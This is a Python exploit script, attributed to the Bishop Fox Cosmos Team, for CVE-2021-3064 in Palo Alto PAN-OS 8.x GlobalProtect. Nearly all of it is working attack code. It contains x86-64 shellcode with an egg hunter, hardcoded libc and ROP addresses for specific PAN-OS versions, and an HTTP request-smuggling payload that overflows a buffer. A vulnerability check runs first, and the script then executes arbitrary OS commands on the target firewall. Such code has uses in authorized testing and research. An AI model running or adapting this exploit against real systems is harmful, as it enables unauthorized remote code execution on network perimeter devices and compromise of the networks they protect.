#!/usr/bin/env python3

#
# Bishop Fox Cosmos Team
# Pan-OS 8.x_vm buffer overflow exploit 
#
# 4/25/2022
#
# Run: ./CVE-2021-3064.py
#

import struct
import ssl
import socket
import sys
import time
import base64

# These addresses are verified as universal for PanOS versions:
#   8.1.12
#   8.1.16
#   8.1.17 (only with HMAC auth bypass, which you need to do manually on the firewall)
systemAddr = 0x7ffff70176b0
ROPGadget  = 0x7ffff704a72d

# NULL-free shellcode for strcpy() overflow
exploitPayload = (

    # 2nd stage of shellcode
    "\x48\xc7\xc0\x47\x41\x58\x58"              # mov rax, 0x58584147           # don't pollute the heap with fake egg
    "\x48\xff\xc0"                              # inc rax                       # rax = 0x58584148 = "HAXX" = egg
    "\x31\xc9\x48\x83\xe9\x01"                  # mov rcx, 0xffffffffffffffff   # count forever
    "\x48\xc7\xc7\x08\x01\x01\x01"              # mov rdi, 0x01010108           # start address for egg hunt on heap
    "\xf2\xaf"                                  # repne scasd eax, dword [rdi]  # find "HAXX"
    "\xff\xe2"                                  # jmp rdx                       # system("HAXX; OS commands;")
    "\x90\x90\x90\x90\x90\x90\x90"                                      
    "\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90"                      
    
    # 1st stage (entry point) of shellcode starts here
    "\x48\xba__SYSTEM__\xff\xff"                # mov rdx, 0xffff7ffff70176b0
    "\x48\xc1\xe2\x10"                          # shl rdx, 16
    "\x48\xc1\xea\x10"                          # shr rdx, 16   # rdx=0x00007ffff70176b0 (system @ libpthread-2.12.so)
    "\x90\x90"                                  # nop padding
    "\xeb\xb8"                                  # jmp -70       # jump to 2nd stage of shellcode

    # Last 6 characters (7 with the strcpy()'d NULL) replace RIP on the stack
    "__ROP_GADGET__"                            # RET overwrite. 0x007ffff704a72d @ libc-2.12.so = "jmp rsi" 

).replace("__SYSTEM__",     struct.pack('<Q', systemAddr)[0:6].decode('raw_unicode_escape'))\
 .replace("__ROP_GADGET__", struct.pack('<Q', ROPGadget)[0:6].decode('raw_unicode_escape'))

# The good stuff
payload = (
    "HEAD /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n"
    # for 8.1.17 "HEAD /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345&ts=AAAAAAAAAAAAAAAAAAAAAA&token=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE= HTTP/1.1\r\n"
    "Transfer-Encoding\r\n"
    "Connection: keep-alive\r\n"
    "Content-length:LLLLL\r\n"
    "\r\n"
)
smuggledRequest = (
    "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.0\r\n"
    # for 8.1.17 "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345&ts=AAAAAAAAAAAAAAAAAAAAAA&token=QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUE= HTTP/1.0\r\n"
    "X-Real-IP: XXXXX\r\n"
    "X-Real-PORT: ZZZZZ\r\n"
    "\r\n"
    "HAXX HAXX HAXX HAXX HAXX HAXX HAXX HAXX;YYYYY;\r\n" # 8 HAXX for alignment reliability with the "rep scasd" egg hunter
    "\r\n"
)

# Functions
def getConnectedSocket(host, port):
    # Setup SSL
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    sslSock = ctx.wrap_socket(tcpSock, server_hostname=host)

    # Try SSL. Fall back to clear text if it fails.
    sock = sslSock
    try:
        sock.connect((host, port))
    except ssl.SSLError:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        try:
            sock.connect((host, port))
        except:
            print("ERROR: couldn't connect to %s:%d" % (host, port))
            exit(1)

    return sock

# Helper to send bytes to a socket and read a response
def send_recieve(sock, data):
    try:
        sock.sendall(data)
        return sock.recv(4096).decode().split('\r\n')
    except Exception as e:
        print("send_receive exception: ", e)
        return None

# Return True or False
def is_vulnerable(host, port):
    # connect to remote server
    sock = getConnectedSocket(host, port)

    # send request designed to elicit "Invalid input"
    payload = "GET /clientcert-info.sslvpn? HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
    r = send_recieve(sock, payload)

    if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
        reason = "Not vulnerable: doesn't look like Palo Alto Global Protect"
        return (False, reason)

    if not "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
        reason = "Not vulnerable: didn't receive expected response ('Invalid input') from Global Protect"
        return (False, reason)

    # send request that will pass for <= 8.1.16, but error with "Invalid input" for >= 8.1.17
    payload = "GET /clientcert-info.sslvpn?cert_valid=true&cert_user=foo&cert_present=bar&cert_hostid=12345 HTTP/1.1\r\n\r\n".encode('raw_unicode_escape')
    r = send_recieve(sock, payload)

    if (r == None) or (not "HTTP/1.1 552 Custom error" in r):
        reason = "Not vulnerable: didn't receive expected response ('HTTP/1.1 552 Custom error')"
        return (False, reason)

    if "<p>Invalid input: /clientcert-info.sslvpn</p>" in r:
        reason = "Not vulnerable: found Pan-OS version >= 8.1.17 (see code comments re: 8.1.17)"
        return (False, reason)
        # for 8.1.17 support: return (True, reason)
    
    if "Transfer-Encoding: chunked" in r:
        if "Connection: keep-alive" in r:
            if "Content-Type: text/html" in r:
                return (True, "Vulnerable!")

    return (False, "Not vulnerable? Unknown. Response: %s" % str(r))

# Either exit() if unsuccessful, or return if (probably) successful.
def do_exploit():
    global payload, host, port

    print("[+] do_exploit(%s:%d)" % (host, port))
    try:
        sock = getConnectedSocket(host, port)   
        sock.send(payload.encode('raw_unicode_escape'))
    
        # Read firewall response
        #print("[+] Read response")
        r = sock.recv(512).decode().split('\r\n')
        response = "\n".join(r)
        sock.close()
    except Exception as e:
        print("\nException: ", e)

    # If we get a response matching the following parameters, then the exploit
    # was _probably_ successful. Or it crashed the remote process. Figure it out ;)
    if "HTTP/1.1 400 Bad Request" in response and "Content-Length: 176" in response:
        print("[+] Received the expected response! Exploit appears successful.")
    else:
        print("[!] Did NOT receive the expected response.\n\n%s" % response)
        exit(1)


# Handle command-line
if len(sys.argv) != 3:
    print("%s host[:port] -t | 'OS commands to execute'" % sys.argv[0])
    print("\nSpecify either '-t' or commands to execute.")
    print("Using -t will test for vulnerability without attempting the exploit.")
    exit(1)

host = sys.argv[1]
if ':' in host:
    (host, port) = host.split(':')
    port = int(port)
else:
    host = sys.argv[1]
    port = 20077

attemptExploit = True
if sys.argv[2] == '-t':
    attemptExploit = False
else:
    rceCommands = sys.argv[2]


# Test vuln before trying the exploit
print("[+] Testing to see if %s is vulnerable..." % host)
(status, reason) = is_vulnerable(host, port)
if status == False:
    print("[!] %s" % reason)
    exit(2)

if attemptExploit == False:
    print("[+] %s" % reason)
    exit(0)


# Populate our payload buffer
smuggledRequest = smuggledRequest.replace("XXXXX", exploitPayload)
smuggledRequest = smuggledRequest.replace("YYYYY", rceCommands)
payload = payload.replace("LLLLL", str(len(smuggledRequest)))
payload = payload + smuggledRequest

# Unleash the beast
print("[+] %s appears to be vulnerable. Trying the exploit!" % host)
do_exploit()
print("[+] All done. So long, and thanks for all the fish!")

# EOF